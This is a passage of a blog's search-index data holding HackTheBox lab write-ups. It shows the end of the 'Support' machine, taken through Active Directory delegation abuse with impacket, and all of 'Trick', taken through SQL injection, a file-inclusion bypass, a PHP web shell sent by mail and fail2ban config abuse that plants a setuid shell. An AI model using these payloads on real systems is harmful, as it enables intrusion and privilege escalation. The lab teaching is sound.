(array[i] ^ Protected.key[i % Protected.key.Length] ^ 223); } return Encoding.Default.GetString(array2); } // Token: 0x04000005 RID: 5 private static string enc_password = \u0026#34;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E\u0026#34;; // Token: 0x04000006 RID: 6 private static byte[] key = Encoding.ASCII.GetBytes(\u0026#34;armando\u0026#34;); } We can either decrypt it ourselves Or run binary in dnspy with a breakpoint and make it decrypt password for us We could also intercept packets via Wireshark Let\u0026rsquo;s find the arguments it needs Set breakpoint right before the connection to ldap server And run with arguments Now we have our password for support\\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz Let\u0026rsquo;s check the creds via crackmapexec └─$ crackmapexec smb support.htb -u \u0026#39;ldap\u0026#39; -p \u0026#39;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz\u0026#39; SMB support.htb 445 DC [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False) SMB support.htb 445 DC [+] support.htb\\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz We can run: ldapsearch -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b \u0026quot;DC=support,DC=htb\u0026quot; ldapdomaindump -u 'support.htb\\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' support.htb -o ldapdump.support.htb bloodhound-python -c all -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb -ns 10.10.11.174 --zip I used bloodhound and ldapdomaindump (since some fields were not visible in bloodhound) ldapdomaindump shows info field with potential creds support:Ironside47pleasure40Watchful We have creds for support user └─$ crackmapexec smb support.htb -u \u0026#39;support\u0026#39; -p \u0026#39;Ironside47pleasure40Watchful\u0026#39; SMB support.htb 445 DC [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False) SMB support.htb 445 DC [+] support.htb\\support:Ironside47pleasure40Watchful Moreover support has GenericAll rights over DC.support.htb and is a MemberOf -\u0026gt; REMOTE MANAGEMENT USERS We can evil-winrm Root/Domain Admin support has GenericAll rights over DC.support.htb https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#genericall-genericwrite-write-on-computer-user https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces#genericall-genericwrite-write-on-computer https://www.thehacker.recipes/ad/movement/dacl https://orange-cyberdefense.github.io/ocd-mindmaps/ We can perform RBCD We can either do it from Windows by uploading required tools (PowerMad, PowerSploit, Rubeus) or from Linux using impacket and other tools I performed attack from Linux, you can check 0xdf for Windows Now we need to: Create a New Computer impacket-addcomputer -computer-name 'FAKEPC$' -computer-pass 'P@ssw0rd123' -dc-ip 10.10.11.174 support.htb/support Configure the DC to trust new computer to make authorization decisions on it’s behalf impacket-rbcd -delegate-to 'DC$' -delegate-from 'FAKEPC$' -action 'write' -dc-ip 10.10.11.174 'support.htb'/'support' Ask for a TGT for the created computer account, followed by a S4U2Self request to get a forwardable TGS ticket, and then a S4U2Proxy request to get a valid TGS ticket for a specific SPN on the targeted computer getST.py -spn cifs/DC01.inlanefreight.local -impersonate Administrator -dc-ip 10.129.205.35 inlanefreight.local/HACKTHEBOX:Hackthebox123+\\! impacket-getST -spn 'cifs/DC.support.htb' -impersonate Administrator -dc-ip 10.10.11.174 'support.htb'/'FAKEPC$' Add the Ticket to KRB5CCNAME export KRB5CCNAME=./Administrator.ccache Connect as Administrator impacket-psexec -k -no-pass dc.support.htb Make sure to configure /etc/hosts with the target IP and the domain name dc.support.htb └─$ impacket-addcomputer -computer-name \u0026#39;FAKEPC$\u0026#39; -computer-pass \u0026#39;P@ssw0rd123\u0026#39; -dc-ip 10.10.11.174 \u0026#39;support.htb/support\u0026#39; Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation Password: [*] Successfully added machine account FAKEPC$ with password P@ssw0rd123. └─$ impacket-rbcd -delegate-to \u0026#39;DC$\u0026#39; -delegate-from \u0026#39;FAKEPC$\u0026#39; -action \u0026#39;write\u0026#39; -dc-ip 10.10.11.174 \u0026#39;support.htb\u0026#39;/\u0026#39;support\u0026#39; Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] No credentials supplied, supply password Password: [*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty [*] Delegation rights modified successfully! [*] FAKEPC$ can now impersonate users on DC$ via S4U2Proxy [*] Accounts allowed to act on behalf of other identity: [*] FAKEPC$ (S-1-5-21-1677581083-3380853377-188903654-5101) └─$ impacket-getST -spn \u0026#39;cifs/DC.support.htb\u0026#39; -impersonate Administrator -dc-ip 10.10.11.174 \u0026#39;support.htb\u0026#39;/\u0026#39;FAKEPC$\u0026#39; Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation Password: [-] CCache file is not found. Skipping... [*] Getting TGT for user [*] Impersonating Administrator [*] Requesting S4U2self [*] Requesting S4U2Proxy [*] Saving ticket in Administrator.ccache └─$ export KRB5CCNAME=./Administrator.ccache └─$ impacket-psexec -k -no-pass dc.support.htb Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Requesting shares on dc.support.htb..... [*] Found writable share ADMIN$ [*] Uploading file EBxFiPIT.exe [*] Opening SVCManager on dc.support.htb..... [*] Creating service mhpF on dc.support.htb..... [*] Starting service mhpF..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.20348.859] (c) Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt; ","date":"August 28, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/support/images/support.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/support/","summary":"Support Enumeration nmap └─$ nmap -p- -Pn 10.10.11.174 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-30 13:05 BST Nmap scan report for 10.10.11.174 (10.10.11.174) Host is up (0.094s latency). Not shown: 65517 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws └─$ nmap -Pn -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV 10.","tags":["HTB","ldapsearch","crackmapexec","smbclient","dotnet","reverse-engineering","dnspy","bloodhound","ldapdomaindump","evil-winrm","impacket","rbcd","powerview","powermad","rubeus","sharp-collection","ms-ds-machineaccountquota"],"title":"[HTB] Machine: Support"},{"categories":null,"contents":"Trick Enumeration nmap └─$ nmap -Pn -p- 10.10.11.166 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-29 10:59 BST Stats: 0:13:46 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 91.73% done; ETC: 11:14 (0:01:14 remaining) Nmap scan report for 10.10.11.166 (10.10.11.166) Host is up (0.17s latency). Not shown: 65531 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 25/tcp open smtp 53/tcp open domain 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 906.34 seconds └─$ nmap -Pn -p22,25,53,80 -sC -sV 10.10.11.166 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-29 11:17 BST Nmap scan report for 10.10.11.166 (10.10.11.166) Host is up (0.22s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA) | 256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA) |_ 256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519) 25/tcp open smtp Postfix smtpd |_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING 53/tcp open domain ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux) | dns-nsid: |_ bind.version: 9.11.5-P4-5.1+deb10u7-Debian 80/tcp open http nginx 1.14.2 |_http-title: Coming Soon - Start Bootstrap Theme |_http-server-header: nginx/1.14.2 Service Info: Host: debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 49.25 seconds Web Server dns zone transfer Guessing trick.htb worked └─$ dig axfr @10.10.11.166 trick.htb ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.18.16-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; axfr @10.10.11.166 trick.htb ; (1 server found) ;; global options: +cmd trick.htb. 604800 IN SOA trick.htb. root.trick.htb. 5 604800 86400 2419200 604800 trick.htb. 604800 IN NS trick.htb. trick.htb. 604800 IN A 127.0.0.1 trick.htb. 604800 IN AAAA ::1 preprod-payroll.trick.htb. 604800 IN CNAME trick.htb. trick.htb. 604800 IN SOA trick.htb. root.trick.htb. 5 604800 86400 2419200 604800 ;; Query time: 224 msec ;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP) ;; WHEN: Tue Aug 29 16:07:42 BST 2023 ;; XFR size: 6 records (messages 1, bytes 231) vhosts └─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u \u0026#39;http://trick.htb/\u0026#39; -H \u0026#39;Host: FUZZ.trick.htb\u0026#39; -fs 5480 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://trick.htb/ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt :: Header : Host: FUZZ.trick.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response size: 5480 ________________________________________________ gobuster └─$ gobuster dir -u http://trick.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://trick.htb [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt [+] Timeout: 10s =============================================================== 2023/08/29 16:11:30 Starting gobuster in directory enumeration mode =============================================================== /assets (Status: 301) [Size: 185] [--\u0026gt; http://trick.htb/assets/] /css (Status: 301) [Size: 185] [--\u0026gt; http://trick.htb/css/] /js (Status: 301) [Size: 185] [--\u0026gt; http://trick.htb/js/] Nothing on smtp └─$ nmap -p 25 --script=smtp-enum-users 10.10.11.166 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-29 16:16 BST Nmap scan report for trick.htb (10.10.11.166) Host is up (0.19s latency). PORT STATE SERVICE 25/tcp open smtp | smtp-enum-users: |_ Method RCPT returned a unhandled status code. Nmap done: 1 IP address (1 host up) scanned in 12.67 seconds Foothold/User payroll.trick.htb └─$ gobuster dir -u http://preprod-payroll.trick.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,php --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://preprod-payroll.trick.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/08/29 16:14:49 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 302) [Size: 9546] [--\u0026gt; login.php] /home.php (Status: 200) [Size: 486] /login.php (Status: 200) [Size: 5571] /header.php (Status: 200) [Size: 2548] /users.php (Status: 200) [Size: 2197] /assets (Status: 301) [Size: 185] [--\u0026gt; http://preprod-payroll.trick.htb/assets/] /ajax.php (Status: 200) [Size: 0] /database (Status: 301) [Size: 185] [--\u0026gt; http://preprod-payroll.trick.htb/database/] /readme.txt (Status: 200) [Size: 149] /navbar.php (Status: 200) [Size: 1382] /department.php (Status: 200) [Size: 4844] /topbar.php (Status: 200) [Size: 585] /position.php (Status: 200) [Size: 5549] /employee.php (Status: 200) [Size: 2717] Web page Looks like some login page Let\u0026rsquo;s try default SQLi payload ' or 1=1-- - works We\u0026rsquo;re in By the way, I later found out that it is a actual software https://www.sourcecodester.com/php/14475/payroll-management-system-using-phpmysql-source-code.html Googling for Recruitment Management System Payroll Management System php should be enough If we inspect users page and edit administrator, we can see hidden password in sources SuperGucciRainbowCake But the creds didn\u0026rsquo;t work anywhere So since we have sqli, let\u0026rsquo;s try sqlmap └─$ sqlmap -r login.req --batch --level 5 --risk 3 ___ __H__ ___ ___[(]_____ ___ ___ {1.7.8#stable} |_ -| . [,] | .\u0026#39;| . | |___|_ [)]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user\u0026#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 16:56:44 /2023-08-29/ [16:56:44] [INFO] parsing HTTP request from \u0026#39;login.req\u0026#39; custom injection marker (\u0026#39;*\u0026#39;) found in POST body. Do you want to process it? [Y/n/q] Y [16:56:44] [INFO] testing connection to the target URL [16:56:45] [INFO] checking if the target is protected by some kind of WAF/IPS [16:56:45] [INFO] testing if the target URL content is stable [16:56:45] [INFO] target URL content is stable [16:56:45] [INFO] testing if (custom) POST parameter \u0026#39;#1*\u0026#39; is dynamic [16:56:46] [WARNING] (custom) POST parameter \u0026#39;#1*\u0026#39; does not appear to be dynamic [16:56:46] [WARNING] heuristic (basic) test shows that (custom) POST parameter \u0026#39;#1*\u0026#39; might not be injectable [16:56:46] [INFO] testing for SQL injection on (custom) POST parameter \u0026#39;#1*\u0026#39; [16:56:46] [INFO] testing \u0026#39;AND boolean-based blind - WHERE or HAVING clause\u0026#39; [16:57:11] [INFO] testing \u0026#39;OR boolean-based blind - WHERE or HAVING clause\u0026#39; [16:57:32] [INFO] testing \u0026#39;OR boolean-based blind - WHERE or HAVING clause (NOT)\u0026#39; [16:57:34] [INFO] (custom) POST parameter \u0026#39;#1*\u0026#39; appears to be \u0026#39;OR boolean-based blind - WHERE or HAVING clause (NOT)\u0026#39; injectable [16:57:38] [INFO] heuristic (extended) test shows that the back-end DBMS could be \u0026#39;MySQL\u0026#39; it looks like the back-end DBMS is \u0026#39;MySQL\u0026#39;. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y ... (custom) POST parameter \u0026#39;#1*\u0026#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N sqlmap identified the following injection point(s) with a total of 604 HTTP(s) requests: --- Parameter: #1* ((custom) POST) Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause (NOT) Payload: username=\u0026#39; OR NOT 8378=8378-- xHqp\u0026amp;password= Type: error-based Title: MySQL \u0026gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) Payload: username=\u0026#39; OR (SELECT 6966 FROM(SELECT COUNT(*),CONCAT(0x71766b6a71,(SELECT (ELT(6966=6966,1))),0x7170706271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- duBl\u0026amp;password= Type: time-based blind Title: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: username=\u0026#39; AND (SELECT 3579 FROM (SELECT(SLEEP(5)))wnFL)-- IoKl\u0026amp;password= --- [16:59:24] [INFO] the back-end DBMS is MySQL web application technology: Nginx 1.14.2 back-end DBMS: MySQL \u0026gt;= 5.0 (MariaDB fork) Let\u0026rsquo;s dump dbs └─$ sqlmap -r login.req --dump --dbs ___ __H__ ___ ___[(]_____ ___ ___ {1.7.8#stable} |_ -| . [\u0026#39;] | .\u0026#39;| . | |___|_ [,]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user\u0026#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 17:00:04 /2023-08-29/ [17:00:04] [INFO] parsing HTTP request from \u0026#39;login.req\u0026#39; custom injection marker (\u0026#39;*\u0026#39;) found in POST body. Do you want to process it? [Y/n/q] y [17:00:08] [INFO] resuming back-end DBMS \u0026#39;mysql\u0026#39; [17:00:08] [INFO] testing connection to the target URL sqlmap resumed the following injection point(s) from stored session: ... [17:01:20] [INFO] retrieved: \u0026#39;\u0026#39; [17:01:20] [INFO] retrieved: \u0026#39;0\u0026#39; [17:01:20] [INFO] retrieved: \u0026#39;1\u0026#39; [17:01:21] [INFO] retrieved: \u0026#39;SuperGucciRainbowCake\u0026#39; [17:01:21] [INFO] retrieved: \u0026#39;Enemigosss\u0026#39; Database: payroll_db Table: users [1 entry] +----+-----------+---------------+--------+---------+---------+-----------------------+------------+ | id | doctor_id | name | type | address | contact | password | username | +----+-----------+---------------+--------+---------+---------+-----------------------+------------+ | 1 | 0 | Administrator | 1 | \u0026lt;blank\u0026gt; | \u0026lt;blank\u0026gt; | SuperGucciRainbowCake | Enemigosss | +----+-----------+---------------+--------+---------+---------+-----------------------+------------+ [17:01:21] [INFO] table \u0026#39;payroll_db.users\u0026#39; dumped to CSV file \u0026#39;/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/dump/payroll_db/users.csv\u0026#39; [17:01:21] [INFO] fetched data logged to text files under \u0026#39;/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb\u0026#39; Nothing interesting We can try checking privileges └─$ sqlmap -r login.req --privilege ___ __H__ ___ ___[.]_____ ___ ___ {1.7.8#stable} |_ -| . [\u0026#34;] | .\u0026#39;| . | |___|_ [,]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user\u0026#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 17:09:00 /2023-08-29/ [17:09:00] [INFO] parsing HTTP request from \u0026#39;login.req\u0026#39; custom injection marker (\u0026#39;*\u0026#39;) found in POST body. Do you want to process it? [Y/n/q] y [17:09:01] [INFO] resuming back-end DBMS \u0026#39;mysql\u0026#39; [17:09:01] [INFO] testing connection to the target URL sqlmap resumed the following injection point(s) from stored session: ... [17:09:02] [INFO] retrieved: \u0026#39;\u0026#39;remo\u0026#39;@\u0026#39;localhost\u0026#39;\u0026#39; [17:09:03] [INFO] retrieved: \u0026#39;FILE\u0026#39; database management system users privileges: [*] \u0026#39;remo\u0026#39;@\u0026#39;localhost\u0026#39; [1]: privilege: FILE We have FILE privileges, so we can read files Test on /etc/passwd and it works └─$ sqlmap -r login.req --batch --file-read=/etc/passwd ___ __H__ ___ ___[,]_____ ___ ___ {1.7.8#stable} |_ -| . [,] | .\u0026#39;| . | |___|_ [.]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user\u0026#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 17:17:04 /2023-08-29/ [17:17:04] [INFO] parsing HTTP request from \u0026#39;login.req\u0026#39; custom injection marker (\u0026#39;*\u0026#39;) found in POST body. Do you want to process it? [Y/n/q] Y [17:17:04] [INFO] resuming back-end DBMS \u0026#39;mysql\u0026#39; [17:17:04] [INFO] testing connection to the target URL sqlmap resumed the following injection point(s) from stored session: ... 2F7362696E2F6E6F6C6F67696E0A68706C69703A783A3131353A373A48504C49502073797374656D20757365722C2C2C3A2F7661722F72756E2F68706C69703A2F62696E2F66616C73650A44656269616E2D67646D3A783A3131363A3132343A476E6F6D6520446973706C6179204D616E616765723A2F7661722F6C69622F67646D333A2F62696E2F66616C73650A73797374656D642D636F726564756D703A783A3939393A3939393A73797374656D6420436F72652044756D7065723A2F3A2F7573722F7362696E2F6E6F6C6F67696E0A6D7973716C3A783A3131373A3132353A4D7953514C205365727665722C2C2C3A2F6E6F6E6578697374656E743A2F62696E2F66616C73650A737368643A783A3131383A36353533343A3A2F72756E2F737368643A2F7573722F7362696E2F6E6F6C6F67696E0A706F73746669783A783A3131393A3132363A3A2F7661722F73706F6F6C2F706F73746669783A2F7573722F7362696E2F6E6F6C6F67696E0A62696E643A783A3132303A3132383A3A2F7661722F63616368652F62696E643A2F7573722F7362696E2F6E6F6C6F67696E0A6D69636861656C3A783A313030313A313030313A3A2F686F6D652F6D69636861656C3A2F62696E2F do you want confirmation that the remote file \u0026#39;/etc/passwd\u0026#39; has been successfully downloaded from the back-end DBMS file system? [Y/n] Y [17:17:28] [INFO] retrieved: \u0026#39;2351\u0026#39; [17:17:28] [INFO] the local file \u0026#39;/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd\u0026#39; and the remote file \u0026#39;/etc/passwd\u0026#39; have the same size (2351 B) We can check other possible vhosts sqlmap -r login.req --batch --file-read=/etc/nginx/sites-enabled/default We have another one preprod-marketing.trick.htb └─$ cat /home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default server { listen 80 default_server; listen [::]:80 default_server; server_name trick.htb; root /var/www/html; index index.html index.htm index.nginx-debian.html; server_name _; location / { try_files $uri $uri/ =404; } location ~ \\.php$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php7.3-fpm.sock; } } server { listen 80; listen [::]:80; server_name preprod-marketing.trick.htb; root /var/www/market; index index.php; location / { try_files $uri $uri/ =404; } location ~ \\.php$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock; } } server { listen 80; listen [::]:80; server_name preprod-payroll.trick.htb; root /var/www/payroll; index index.php; location / { try_files $uri $uri/ =404; } location ~ \\.php$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:/run/php/php7.3-fpm.sock; } } http://preprod-marketing.trick.htb/ We have http://preprod-marketing.trick.htb/index.php?page= We can try basic lfi payload to see if it works But both absolute and relative path payloads doesn\u0026rsquo;t seem to work Trying http://preprod-marketing.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=index.php doesn\u0026rsquo;t work either So let\u0026rsquo;s check index.php via sqlmap └─$ cat /home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_var_www_market_index.php \u0026lt;?php $file = $_GET[\u0026#39;page\u0026#39;]; if(!isset($file) || ($file==\u0026#34;index.php\u0026#34;)) { include(\u0026#34;/var/www/market/home.html\u0026#34;); } else{ include(\u0026#34;/var/www/market/\u0026#34;.str_replace(\u0026#34;../\u0026#34;,\u0026#34;\u0026#34;,$file)); } ?\u0026gt; Okay, we can bypass it via ....//, since it will replace the ../ which will leave ../ The web server is ran by michael We can check if michael has ssh key and he has Poison log path We can also nginx logs So we can try log poisoning Have to be careful, if we make mistake we won\u0026rsquo;t be able to exploit it this way Which is what I did Now we have web shell and can get reverse shell SMTP path We can send email to michael via swaks and access it via lfi We know michael\u0026rsquo;s box should be located in /var/mail/michael Send mail: swaks --to michael --from pentest --header \u0026quot;Subject: Pentest\u0026quot; --body '\u0026lt;?php system($_REQUEST[\u0026quot;cmd\u0026quot;]); ?\u0026gt;' --server 10.10.11.166 And check http://preprod-marketing.trick.htb/index.php?page=....//....//....//var/mail/michael\u0026amp;cmd=id Root We have sudo rights michael@trick:~$ sudo -l Matching Defaults entries for michael on trick: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User michael may run the following commands on trick: (root) NOPASSWD: /etc/init.d/fail2ban restart groups Non-standard security group michael@trick:~$ id uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security) We have full control over /etc/fail2ban/action.d michael@trick:~$ find / -group security -ls 2\u0026gt;/dev/null 269281 4 drwxrwx--- 2 root security 4096 Aug 29 19:54 /etc/fail2ban/action.d Let\u0026rsquo;s understand fail2ban The purpose of Fail2ban is to monitor the logs of common services to spot patterns in authentication failures When fail2ban is configured to monitor the logs of a service, it looks at a filter that has been configured specific to that service. The filter is designed to identify authentication failures for that specific service through the use of complex regular expressions. When a log from any service, like a web server, matches the failregex in its filter, a predefined action is executed for that service. https://www.digitalocean.com/community/tutorials/how-fail2ban-works-to-protect-services-on-a-linux-server Now we can check the configs and try abusing it We have jail for sshd and iptables-multiport config for actions ... [DEFAULT] ... # Default banning action (e.g. iptables, iptables-new, # iptables-multiport, shorewall, etc) It is used to define # action_* variables. Can be overridden globally or per # section within jail.local file banaction = iptables-multiport banaction_allports = iptables-allports ... [sshd] # To use more aggressive sshd modes set filter parameter \u0026#34;mode\u0026#34; in jail.local: # normal (default), ddos, extra or aggressive (combines all). # See \u0026#34;tests/files/logs/sshd\u0026#34; or \u0026#34;filter.d/sshd.conf\u0026#34; for usage example and details. #mode = normal port = ssh logpath = %(sshd_log)s backend = %(sshd_backend)s bantime = 10s ... Since we can write to iptables-multiport.conf To be specific change actionban parameter, so that it executes command when banning specific ip We don\u0026rsquo;t have write permissions, but we can mv it and then copy it (since we have ownership of the folder), so that we become an owner of that file Command: cp /bin/bash /tmp/rooted; chmod 4777 /tmp/rooted https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/ michael@trick:/etc/fail2ban/action.d$ mv iptables-multiport.conf iptables-multiport.conf.bak michael@trick:/etc/fail2ban/action.d$ ls -lha iptables* -rw-r--r-- 1 root root 1.4K Aug 29 20:18 iptables-allports.conf -rw-r--r-- 1 root root 2.7K Aug 29 20:18 iptables-common.conf -rw-r--r-- 1 root root 1.4K Aug 29 20:18 iptables.conf -rw-r--r-- 1 root root 2.0K Aug 29 20:18 iptables-ipset-proto4.conf -rw-r--r-- 1 root root 2.2K Aug 29 20:18 iptables-ipset-proto6-allports.conf -rw-r--r-- 1 root root 2.2K Aug 29 20:18 iptables-ipset-proto6.conf -rw-r--r-- 1 root root 1.4K Aug 29 20:18 iptables-multiport.conf.bak -rw-r--r-- 1 root root 2.1K Aug 29 20:18 iptables-multiport-log.conf -rw-r--r-- 1 root root 1.5K Aug 29 20:18 iptables-new.conf -rw-r--r-- 1 root root 2.6K Aug 29 20:18 iptables-xt_recent-echo.conf michael@trick:/etc/fail2ban/action.d$ cp iptables-multiport.conf.bak iptables-multiport.conf michael@trick:/etc/fail2ban/action.d$ ls -lha iptables* -rw-r--r-- 1 root root 1.4K Aug 29 20:18 iptables-allports.conf -rw-r--r-- 1 root root 2.7K Aug 29 20:18 iptables-common.conf -rw-r--r-- 1 root root 1.4K Aug 29 20:18 iptables.conf -rw-r--r-- 1 root root 2.0K Aug 29 20:18 iptables-ipset-proto4.conf -rw-r--r-- 1 root root 2.2K Aug 29 20:18 iptables-ipset-proto6-allports.conf -rw-r--r-- 1 root root 2.2K Aug 29 20:18 iptables-ipset-proto6.conf -rw-r--r-- 1 michael michael 1.4K Aug 29 20:19 iptables-multiport.conf -rw-r--r-- 1 root root 1.4K Aug 29 20:18 iptables-multiport.conf.bak -rw-r--r-- 1 root root 2.1K Aug 29 20:18 iptables-multiport-log.conf -rw-r--r-- 1 root root 1.5K Aug 29 20:18 iptables-new.conf -rw-r--r-- 1 root root 2.6K Aug 29 20:18 iptables-xt_recent-echo.conf Now restart michael@trick:/etc/fail2ban/action.d$ sudo /etc/init.d/fail2ban restart sh: 0: getcwd() failed: No such file or directory [ ok ] Restarting fail2ban (via systemctl): fail2ban.service. Start crackmapexec crackmapexec ssh trick.htb -u pentest -p /usr/share/wordlists/rockyou.txt Check /tmp after a while and we are root ","date":"August 28, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/trick/images/trick.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/trick/","summary":"Trick Enumeration nmap └─$ nmap -Pn -p- 10.10.11.166 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-29 10:59 BST Stats: 0:13:46 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 91.73% done; ETC: 11:14 (0:01:14 remaining) Nmap scan report for 10.10.11.166 (10.10.11.166) Host is up (0.17s latency). Not shown: 65531 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 25/tcp open smtp 53/tcp open domain 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 906.","tags":["HTB","smtp","smtp-user-enum","zone-transfer","vhosts","employee-management-system","sqli","sqli-bypass","cve-2022-28468","boolean-based-sqli","sqlmap","file-read","lfi","directory-traversal","mail-poisoning","log-poisoning","fail2ban"],"title":"[HTB] Machine: 